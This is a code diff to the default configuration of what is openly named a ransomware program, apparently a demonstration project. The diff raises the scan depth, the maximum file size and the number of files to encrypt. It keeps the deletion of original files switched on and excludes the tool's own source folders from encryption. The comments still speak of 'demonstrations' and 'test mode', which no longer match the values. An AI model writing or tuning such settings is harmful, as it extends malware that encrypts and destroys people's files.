@@ -40,14 +40,14 @@ export const DEFAULT_CONFIG: RansomwareConfig = {
     deleteOriginalFiles: true, // Default is false for safety
 
     // File targeting
-    maxScanDepth: 3, // Reasonable depth for demonstrations
-    maxTargetFileSizeMB: 10, // Default max file size (10MB)
-    maxFilesToEncrypt: 5, // Default number of files for test mode
+    maxScanDepth: 10, // Reasonable depth for demonstrations
+    maxTargetFileSizeMB: 100, // Default max file size (10MB)
+    maxFilesToEncrypt: 100, // Default number of files for test mode
     skipHiddenFiles: true, // Skip hidden files by default
 
     // Use the default lists from fileScanner.ts
     targetExtensions: [], // Empty means use default list
-    excludedDirectories: [], // Empty means use default list
+    excludedDirectories: ['cripto_ransonware', 'src'], // Empty means use default list
 
     // Encryption settings
     encryptedExtension: '.encrypted', // Default extension for encrypted files
